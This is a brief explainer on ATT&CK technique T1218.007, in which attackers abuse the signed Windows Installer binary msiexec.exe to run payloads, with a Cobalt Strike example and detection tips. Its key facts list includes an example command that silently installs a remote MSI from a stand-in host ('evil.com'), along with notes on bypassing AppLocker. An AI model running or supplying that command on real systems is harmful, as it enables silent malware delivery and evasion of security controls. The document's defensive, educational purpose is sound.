# T1218.007

## What it is
Like using a building's own security guard to smuggle contraband past the front desk, `msiexec.exe` is abused to execute malicious payloads under the guise of a trusted Windows Installer process. Specifically, T1218.007 covers adversaries leveraging the legitimate Microsoft Windows Installer binary (`msiexec.exe`) to proxy execution of arbitrary code, bypassing application whitelisting and security controls.

## Why it matters
In 2021, attackers distributing the Cobalt Strike framework used spear-phishing emails containing `.msi` packages; victims who double-clicked the attachment triggered `msiexec.exe` to silently install a backdoor while the process appeared completely routine to endpoint monitoring. Defenders who only alert on `powershell.exe` or `cmd.exe` miss this entirely, making MSI-based delivery a favorite for living-off-the-land operations.

## Key facts
- `msiexec.exe` can execute remote MSI packages directly over HTTP/HTTPS via the `/i` flag (e.g., `msiexec /i http://evil.com/payload.msi /quiet`), enabling fileless-style delivery
- The `/quiet` and `/qn` flags suppress all UI prompts, making execution invisible to the logged-in user
- Because `msiexec.exe` is a signed Microsoft binary, it commonly bypasses application whitelisting solutions like AppLocker when rules are not carefully crafted
- MSI packages can embed custom actions (DLLs, executables, scripts) that run during install, providing multiple code execution vectors within a single package
- Detection focus: monitor for `msiexec.exe` spawning unusual child processes, network connections from `msiexec.exe`, and command-line arguments containing URLs
